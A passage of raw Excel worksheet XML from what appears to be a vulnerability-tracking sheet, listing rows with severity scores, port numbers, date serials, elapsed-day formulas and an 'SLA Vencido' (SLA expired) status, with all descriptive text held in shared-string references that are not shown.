        <v>5.3</v>
      </c>
      <c r="O25" s="6"/>
      <c r="P25" s="4"/>
      <c r="Q25" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R25" s="4"/>
      <c r="S25" s="22"/>
      <c r="T25" s="8">
        <v>45202</v>
      </c>
      <c r="U25" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1007</v>
      </c>
      <c r="V25" s="8">
        <f t="shared" si="1"/>
        <v>45292</v>
      </c>
      <c r="W25" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X25" s="12"/>
      <c r="Y25" s="12"/>
      <c r="Z25" s="12"/>
      <c r="AA25" s="13">
        <v>45630</v>
      </c>
      <c r="AB25" s="9" t="s">
        <v>2143</v>
      </c>
      <c r="AC25" s="32" t="s">
        <v>2144</v>
      </c>
      <c r="AD25" s="32" t="s">
        <v>2145</v>
      </c>
      <c r="AE25" s="9"/>
      <c r="AF25" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG25" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="26" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A26" s="5">
        <v>25</v>
      </c>
      <c r="B26" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C26" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D26" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E26" s="4"/>
      <c r="F26" s="4"/>
      <c r="G26" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H26" s="4" t="s">
        <v>2146</v>
      </c>
      <c r="I26" s="6" t="s">
        <v>2147</v>
      </c>
      <c r="J26" s="4" t="s">
        <v>2148</v>
      </c>
      <c r="K26" s="4"/>
      <c r="L26" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M26" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N26" s="5">
        <v>4.8</v>
      </c>
      <c r="O26" s="6"/>
      <c r="P26" s="4"/>
      <c r="Q26" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R26" s="4"/>
      <c r="S26" s="22"/>
      <c r="T26" s="8">
        <v>45202</v>
      </c>
      <c r="U26" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1007</v>
      </c>
      <c r="V26" s="8">
        <f t="shared" si="1"/>
        <v>45292</v>
      </c>
      <c r="W26" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X26" s="12"/>
      <c r="Y26" s="30"/>
      <c r="Z26" s="30"/>
      <c r="AA26" s="13">
        <v>45630</v>
      </c>
      <c r="AB26" s="9" t="s">
        <v>2149</v>
      </c>
      <c r="AC26" s="32" t="s">
        <v>2150</v>
      </c>
      <c r="AD26" s="32" t="s">
        <v>2151</v>
      </c>
      <c r="AE26" s="27"/>
      <c r="AF26" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG26" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="27" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A27" s="5">
        <v>26</v>
      </c>
      <c r="B27" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C27" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D27" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E27" s="4"/>
      <c r="F27" s="4"/>
      <c r="G27" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H27" s="4" t="s">
        <v>2152</v>
      </c>
      <c r="I27" s="6" t="s">
        <v>2153</v>
      </c>
      <c r="J27" s="4" t="s">
        <v>421</v>
      </c>
      <c r="K27" s="4"/>
      <c r="L27" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M27" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N27" s="5">
        <v>5.3</v>
      </c>
      <c r="O27" s="6"/>
      <c r="P27" s="10"/>
      <c r="Q27" s="4" t="s">
        <v>2154</v>
      </c>
      <c r="R27" s="4"/>
      <c r="S27" s="22"/>
      <c r="T27" s="8">
        <v>44967</v>
      </c>
      <c r="U27" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1242</v>
      </c>
      <c r="V27" s="8">
        <f t="shared" si="1"/>
        <v>45057</v>
      </c>
      <c r="W27" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X27" s="11"/>
      <c r="Y27" s="11"/>
      <c r="Z27" s="11"/>
      <c r="AA27" s="4"/>
      <c r="AB27" s="32" t="s">
        <v>2155</v>
      </c>
      <c r="AC27" s="32" t="s">
        <v>2156</v>
      </c>
      <c r="AD27" s="32" t="s">
        <v>2157</v>
      </c>
      <c r="AE27" s="72" t="s">
        <v>2080</v>
      </c>
      <c r="AF27" s="9"/>
      <c r="AG27" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="28" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A28" s="5">
        <v>27</v>
      </c>
      <c r="B28" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C28" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D28" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E28" s="4"/>
      <c r="F28" s="4"/>
      <c r="G28" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H28" s="4" t="s">
        <v>2159</v>
      </c>
      <c r="I28" s="6" t="s">
        <v>2160</v>
      </c>
      <c r="J28" s="4" t="s">
        <v>2161</v>
      </c>
      <c r="K28" s="4"/>
      <c r="L28" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M28" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N28" s="5">
        <v>5.3</v>
      </c>
      <c r="O28" s="6"/>
      <c r="P28" s="10"/>
      <c r="Q28" s="6" t="s">
        <v>2162</v>
      </c>
      <c r="R28" s="4">
        <v>443</v>
      </c>
      <c r="S28" s="22"/>
      <c r="T28" s="8">
        <v>45195</v>
      </c>
      <c r="U28" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1014</v>
      </c>
      <c r="V28" s="8">
        <f t="shared" si="1"/>
        <v>45285</v>
      </c>
      <c r="W28" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X28" s="11"/>
      <c r="Y28" s="11"/>
      <c r="Z28" s="11"/>
      <c r="AA28" s="8">
        <v>45756</v>
      </c>
      <c r="AB28" s="9" t="s">
        <v>2163</v>
      </c>
      <c r="AC28" s="32" t="s">
        <v>2164</v>
      </c>
      <c r="AD28" s="32" t="s">
        <v>2165</v>
      </c>
      <c r="AE28" s="9"/>
      <c r="AF28" s="4"/>
      <c r="AG28" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="29" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A29" s="5">
        <v>28</v>
      </c>
      <c r="B29" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C29" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D29" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E29" s="4"/>
      <c r="F29" s="4"/>
      <c r="G29" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H29" s="4" t="s">
        <v>2166</v>
      </c>
      <c r="I29" s="6" t="s">
        <v>2167</v>
      </c>
      <c r="J29" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K29" s="4"/>
      <c r="L29" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M29" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N29" s="5" t="s">
        <v>2168</v>
      </c>
      <c r="O29" s="6"/>
      <c r="P29" s="4"/>
      <c r="Q29" s="6" t="s">
        <v>2162</v>
      </c>
      <c r="R29" s="4">
        <v>443</v>
      </c>
      <c r="S29" s="22"/>
      <c r="T29" s="8">
        <v>45195</v>
      </c>
      <c r="U29" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1014</v>
      </c>
      <c r="V29" s="8">
        <f t="shared" si="1"/>
        <v>45285</v>
      </c>
      <c r="W29" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X29" s="11"/>
      <c r="Y29" s="11"/>
      <c r="Z29" s="11"/>
      <c r="AA29" s="8">
        <v>45756</v>
      </c>
      <c r="AB29" s="9" t="s">
        <v>1215</v>
      </c>
      <c r="AC29" s="32" t="s">
        <v>1170</v>
      </c>
      <c r="AD29" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE29" s="4"/>
      <c r="AF29" s="9"/>
      <c r="AG29" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="30" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A30" s="5">
        <v>29</v>
      </c>
      <c r="B30" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C30" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D30" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E30" s="4"/>
      <c r="F30" s="4"/>
      <c r="G30" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H30" s="4" t="s">
        <v>2169</v>
      </c>
      <c r="I30" s="6" t="s">
        <v>2170</v>
      </c>
      <c r="J30" s="4" t="s">
        <v>2122</v>
      </c>
      <c r="K30" s="4"/>
      <c r="L30" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M30" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N30" s="5">
        <v>6.4</v>
      </c>
      <c r="O30" s="14" t="s">
        <v>2171</v>
      </c>
      <c r="P30" s="4"/>
      <c r="Q30" s="6" t="s">
        <v>2172</v>
      </c>
      <c r="R30" s="4">
        <v>4443</v>
      </c>
      <c r="S30" s="22"/>
      <c r="T30" s="8">
        <v>45195</v>
      </c>
      <c r="U30" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1014</v>
      </c>
      <c r="V30" s="8">
        <f t="shared" si="1"/>
        <v>45285</v>
      </c>
      <c r="W30" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X30" s="11"/>
      <c r="Y30" s="11"/>
      <c r="Z30" s="11"/>
      <c r="AA30" s="8">
        <v>45681</v>
      </c>
      <c r="AB30" s="9" t="s">
        <v>2173</v>
      </c>
      <c r="AC30" s="32" t="s">
        <v>2174</v>
      </c>
      <c r="AD30" s="32" t="s">
        <v>2139</v>
      </c>
      <c r="AE30" s="4"/>
      <c r="AF30" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG30" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="31" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A31" s="5">
        <v>30</v>
      </c>
      <c r="B31" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C31" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D31" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E31" s="4"/>
      <c r="F31" s="4"/>
      <c r="G31" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H31" s="4" t="s">
        <v>2175</v>
      </c>
      <c r="I31" s="6" t="s">
        <v>2176</v>
      </c>
      <c r="J31" s="4" t="s">
        <v>2177</v>
      </c>
      <c r="K31" s="4"/>
      <c r="L31" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M31" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N31" s="5">
        <v>5.0999999999999996</v>
      </c>
      <c r="O31" s="6"/>
      <c r="P31" s="4"/>
      <c r="Q31" s="6" t="s">
        <v>2172</v>
      </c>
      <c r="R31" s="4">
        <v>4443</v>
      </c>
      <c r="S31" s="22"/>
      <c r="T31" s="8">
        <v>45195</v>
      </c>
      <c r="U31" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1014</v>
      </c>
      <c r="V31" s="8">
        <f t="shared" si="1"/>
        <v>45285</v>
      </c>
      <c r="W31" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X31" s="11"/>
      <c r="Y31" s="11"/>
      <c r="Z31" s="11"/>
      <c r="AA31" s="8">
        <v>45681</v>
      </c>
      <c r="AB31" s="9" t="s">
        <v>2178</v>
      </c>
      <c r="AC31" s="32" t="s">
        <v>2179</v>
      </c>
      <c r="AD31" s="32" t="s">
        <v>2180</v>
      </c>
      <c r="AE31" s="4"/>
      <c r="AF31" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG31" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="32" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A32" s="5">
        <v>31</v>
      </c>
      <c r="B32" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C32" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D32" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E32" s="4"/>
      <c r="F32" s="4"/>
      <c r="G32" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H32" s="4" t="s">
        <v>2181</v>
      </c>
      <c r="I32" s="6" t="s">
        <v>2182</v>
      </c>
      <c r="J32" s="4" t="s">
        <v>126</v>
      </c>
      <c r="K32" s="9"/>
      <c r="L32" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M32" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N32" s="5">
        <v>4.0999999999999996</v>
      </c>
      <c r="O32" s="6"/>
      <c r="P32" s="10"/>
      <c r="Q32" s="6" t="s">
        <v>2172</v>
      </c>
      <c r="R32" s="4">
        <v>4443</v>
      </c>
      <c r="S32" s="22"/>
      <c r="T32" s="8">
        <v>45195</v>
      </c>
      <c r="U32" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1014</v>
      </c>
      <c r="V32" s="8">
        <f t="shared" si="1"/>
        <v>45285</v>
      </c>
      <c r="W32" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X32" s="11"/>
      <c r="Y32" s="11"/>
      <c r="Z32" s="11"/>
      <c r="AA32" s="8">
        <v>45638</v>
      </c>
      <c r="AB32" s="9" t="s">
        <v>2183</v>
      </c>
      <c r="AC32" s="32" t="s">
        <v>2184</v>
      </c>
      <c r="AD32" s="32" t="s">
        <v>2185</v>
      </c>
      <c r="AE32" s="4"/>
      <c r="AF32" s="9"/>
      <c r="AG32" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="33" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A33" s="5">
        <v>32</v>
      </c>
      <c r="B33" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C33" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D33" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E33" s="4"/>
      <c r="F33" s="4"/>
      <c r="G33" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H33" s="4" t="s">
        <v>2186</v>
      </c>
      <c r="I33" s="4"/>
      <c r="J33" s="4" t="s">
        <v>2187</v>
      </c>
      <c r="K33" s="9"/>
      <c r="L33" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M33" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N33" s="5">
        <v>5.3</v>
      </c>
      <c r="O33" s="6"/>
      <c r="P33" s="10"/>
      <c r="Q33" s="6" t="s">
        <v>2188</v>
      </c>
      <c r="R33" s="4"/>
      <c r="S33" s="22"/>
      <c r="T33" s="8">
        <v>45140</v>
      </c>
      <c r="U33" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1069</v>
      </c>
      <c r="V33" s="8">
        <f t="shared" si="1"/>
        <v>45230</v>
      </c>
      <c r="W33" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X33" s="11"/>
      <c r="Y33" s="11"/>
      <c r="Z33" s="11"/>
      <c r="AA33" s="8"/>
      <c r="AB33" s="9" t="s">
        <v>2189</v>
      </c>
      <c r="AC33" s="32" t="s">
        <v>2190</v>
      </c>
      <c r="AD33" s="32" t="s">
        <v>2191</v>
      </c>
      <c r="AE33" s="27" t="s">
        <v>2192</v>
      </c>
      <c r="AF33" s="9" t="s">
        <v>2193</v>
      </c>
      <c r="AG33" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="34" spans="1:33" ht="348" x14ac:dyDescent="0.35">
      <c r="A34" s="5">
        <v>33</v>
      </c>
      <c r="B34" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C34" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D34" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E34" s="4"/>
      <c r="F34" s="4"/>
      <c r="G34" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H34" s="4" t="s">
        <v>2194</v>
      </c>
      <c r="I34" s="4"/>
      <c r="J34" s="4" t="s">
        <v>2195</v>
      </c>
      <c r="K34" s="9"/>
      <c r="L34" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M34" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N34" s="5">
        <v>5.3</v>
      </c>
      <c r="O34" s="6"/>
      <c r="P34" s="4"/>
      <c r="Q34" s="6" t="s">
        <v>2196</v>
      </c>
      <c r="R34" s="4"/>
      <c r="S34" s="22"/>
      <c r="T34" s="8">
        <v>45109</v>
      </c>
      <c r="U34" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1100</v>
      </c>
      <c r="V34" s="8">
        <f t="shared" si="1"/>
        <v>45199</v>
      </c>
      <c r="W34" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X34" s="11"/>
      <c r="Y34" s="11"/>
      <c r="Z34" s="11"/>
      <c r="AA34" s="8"/>
      <c r="AB34" s="9" t="s">
        <v>2197</v>
      </c>
      <c r="AC34" s="32" t="s">
        <v>2198</v>
      </c>
      <c r="AD34" s="32" t="s">
        <v>2199</v>
      </c>
      <c r="AE34" s="14" t="s">
        <v>2080</v>
      </c>
      <c r="AF34" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG34" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="35" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A35" s="5">
        <v>34</v>
      </c>
      <c r="B35" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C35" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D35" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E35" s="4"/>
      <c r="F35" s="4"/>
      <c r="G35" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H35" s="4" t="s">
        <v>2200</v>
      </c>
      <c r="I35" s="6" t="s">
        <v>2201</v>
      </c>
      <c r="J35" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K35" s="4"/>
      <c r="L35" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M35" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N35" s="5" t="s">
        <v>2202</v>
      </c>
      <c r="O35" s="6"/>
      <c r="P35" s="6"/>
      <c r="Q35" s="6" t="s">
        <v>2203</v>
      </c>
      <c r="R35" s="4"/>
      <c r="S35" s="22"/>
      <c r="T35" s="8">
        <v>44791</v>
      </c>
      <c r="U35" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1418</v>
      </c>
      <c r="V35" s="8">
        <f t="shared" si="1"/>
        <v>44881</v>
      </c>
      <c r="W35" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X35" s="11"/>
      <c r="Y35" s="11"/>
      <c r="Z35" s="11"/>
      <c r="AA35" s="8"/>
      <c r="AB35" s="9" t="s">
        <v>2204</v>
      </c>
      <c r="AC35" s="32" t="s">
        <v>2205</v>
      </c>
      <c r="AD35" s="32" t="s">
        <v>899</v>
      </c>
      <c r="AE35" s="70" t="s">
        <v>2206</v>
      </c>
      <c r="AF35" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG35" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="36" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A36" s="5">
        <v>35</v>
      </c>
      <c r="B36" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C36" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D36" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E36" s="4"/>
      <c r="F36" s="4"/>
      <c r="G36" s="6" t="s">
        <v>2207</v>
      </c>
      <c r="H36" s="4" t="s">
        <v>2208</v>
      </c>
      <c r="I36" s="6" t="s">
        <v>2209</v>
      </c>
      <c r="J36" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K36" s="4"/>
      <c r="L36" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M36" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N36" s="5">
        <v>4.5999999999999996</v>
      </c>
      <c r="O36" s="6"/>
      <c r="P36" s="6"/>
      <c r="Q36" s="6" t="s">
        <v>2210</v>
      </c>
      <c r="R36" s="4">
        <v>1444</v>
      </c>
      <c r="S36" s="22"/>
      <c r="T36" s="8">
        <v>44222</v>
      </c>
      <c r="U36" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1987</v>
      </c>
      <c r="V36" s="8">
        <f t="shared" si="1"/>
        <v>44312</v>
      </c>
      <c r="W36" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X36" s="11"/>
      <c r="Y36" s="11"/>
      <c r="Z36" s="11"/>
      <c r="AA36" s="8">
        <v>45580</v>
      </c>
      <c r="AB36" s="9" t="s">
        <v>2211</v>
      </c>
      <c r="AC36" s="32" t="s">
        <v>2212</v>
      </c>
      <c r="AD36" s="32" t="s">
        <v>2119</v>
      </c>
      <c r="AE36" s="4"/>
      <c r="AF36" s="9" t="s">
        <v>2213</v>
      </c>
      <c r="AG36" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="37" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A37" s="5">
        <v>36</v>
      </c>
      <c r="B37" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C37" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D37" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E37" s="4"/>
      <c r="F37" s="4"/>
      <c r="G37" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H37" s="4" t="s">
        <v>2214</v>
      </c>
      <c r="I37" s="6" t="s">
        <v>2215</v>
      </c>
      <c r="J37" s="4" t="s">
        <v>2216</v>
      </c>
      <c r="K37" s="4"/>
      <c r="L37" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M37" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N37" s="5">
        <v>3.7</v>
      </c>
      <c r="O37" s="6"/>
      <c r="P37" s="6"/>
      <c r="Q37" s="6" t="s">
        <v>2092</v>
      </c>
      <c r="R37" s="4"/>
      <c r="S37" s="22"/>
      <c r="T37" s="8">
        <v>44867</v>
      </c>
      <c r="U37" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1342</v>
      </c>
      <c r="V37" s="8">
        <f t="shared" si="1"/>
        <v>44957</v>
      </c>
      <c r="W37" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X37" s="11"/>
      <c r="Y37" s="11"/>
      <c r="Z37" s="11"/>
      <c r="AA37" s="8"/>
      <c r="AB37" s="9" t="s">
        <v>2217</v>
      </c>
      <c r="AC37" s="32" t="s">
        <v>2218</v>
      </c>
      <c r="AD37" s="32" t="s">
        <v>2219</v>
      </c>
      <c r="AE37" s="71" t="s">
        <v>2080</v>
      </c>
      <c r="AF37" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG37" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="38" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A38" s="5">
        <v>37</v>
      </c>
      <c r="B38" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C38" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D38" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E38" s="4"/>
      <c r="F38" s="4"/>
      <c r="G38" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H38" s="4" t="s">
        <v>2220</v>
      </c>
      <c r="I38" s="6" t="s">
        <v>2221</v>
      </c>
      <c r="J38" s="4" t="s">
        <v>758</v>
      </c>
      <c r="K38" s="4"/>
      <c r="L38" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M38" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N38" s="5">
        <v>3.7</v>
      </c>
      <c r="O38" s="6"/>
      <c r="P38" s="6"/>
      <c r="Q38" s="6" t="s">
        <v>2092</v>
      </c>
      <c r="R38" s="4"/>
      <c r="S38" s="22"/>
      <c r="T38" s="8">
        <v>44867</v>
      </c>
      <c r="U38" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1342</v>
      </c>
      <c r="V38" s="8">
        <f t="shared" si="1"/>
        <v>44957</v>
      </c>
      <c r="W38" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X38" s="11"/>
      <c r="Y38" s="11"/>
      <c r="Z38" s="11"/>
      <c r="AA38" s="8"/>
      <c r="AB38" s="9" t="s">
        <v>2222</v>
      </c>
      <c r="AC38" s="32" t="s">
        <v>761</v>
      </c>
      <c r="AD38" s="32" t="s">
        <v>849</v>
      </c>
      <c r="AE38" s="70" t="s">
        <v>2206</v>
      </c>
      <c r="AF38" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG38" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="39" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A39" s="5">
        <v>38</v>
      </c>
      <c r="B39" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C39" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D39" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E39" s="4"/>
      <c r="F39" s="4"/>
      <c r="G39" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H39" s="4" t="s">
        <v>2223</v>
      </c>
      <c r="I39" s="6" t="s">
        <v>2224</v>
      </c>
      <c r="J39" s="4" t="s">
        <v>2225</v>
      </c>
      <c r="K39" s="4"/>
      <c r="L39" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M39" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N39" s="5">
        <v>3.5</v>
      </c>
      <c r="O39" s="6"/>
      <c r="P39" s="6"/>
      <c r="Q39" s="6" t="s">
        <v>2092</v>
      </c>
      <c r="R39" s="4"/>
      <c r="S39" s="22"/>
      <c r="T39" s="8">
        <v>44867</v>
      </c>
      <c r="U39" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1342</v>
      </c>
      <c r="V39" s="8">
        <f t="shared" si="1"/>
        <v>44957</v>
      </c>
      <c r="W39" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X39" s="11"/>
      <c r="Y39" s="11"/>
      <c r="Z39" s="11"/>
      <c r="AA39" s="8"/>
      <c r="AB39" s="9" t="s">
        <v>2226</v>
      </c>
      <c r="AC39" s="32" t="s">
        <v>2227</v>
      </c>
      <c r="AD39" s="32" t="s">
        <v>2228</v>
      </c>
      <c r="AE39" s="71" t="s">
        <v>2080</v>
      </c>
      <c r="AF39" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG39" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="40" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A40" s="5">
        <v>39</v>
      </c>
      <c r="B40" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C40" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D40" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E40" s="4"/>
      <c r="F40" s="4"/>
      <c r="G40" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H40" s="4" t="s">
        <v>2229</v>
      </c>
      <c r="I40" s="6" t="s">
        <v>2230</v>
      </c>
      <c r="J40" s="4" t="s">
        <v>2231</v>
      </c>
      <c r="K40" s="4"/>
      <c r="L40" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M40" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N40" s="5">
        <v>3.9</v>
      </c>
      <c r="O40" s="6"/>
      <c r="P40" s="6"/>
      <c r="Q40" s="6" t="s">
        <v>2172</v>
      </c>
      <c r="R40" s="4"/>
      <c r="S40" s="22"/>
      <c r="T40" s="8">
        <v>45195</v>
      </c>
      <c r="U40" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>1014</v>
      </c>
      <c r="V40" s="8">
        <f t="shared" si="1"/>
        <v>45285</v>
      </c>
      <c r="W40" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X40" s="11"/>
      <c r="Y40" s="11"/>
      <c r="Z40" s="11"/>
      <c r="AA40" s="8"/>
      <c r="AB40" s="9" t="s">
        <v>2232</v>
      </c>
      <c r="AC40" s="32" t="s">
        <v>2233</v>
      </c>
      <c r="AD40" s="32" t="s">
        <v>2234</v>
      </c>
      <c r="AE40" s="4"/>
      <c r="AF40" s="9" t="s">
        <v>2133</v>
      </c>
      <c r="AG40" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="41" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A41" s="5">
        <v>40</v>
      </c>
      <c r="B41" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C41" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D41" s="5" t="s">
        <v>371</v>
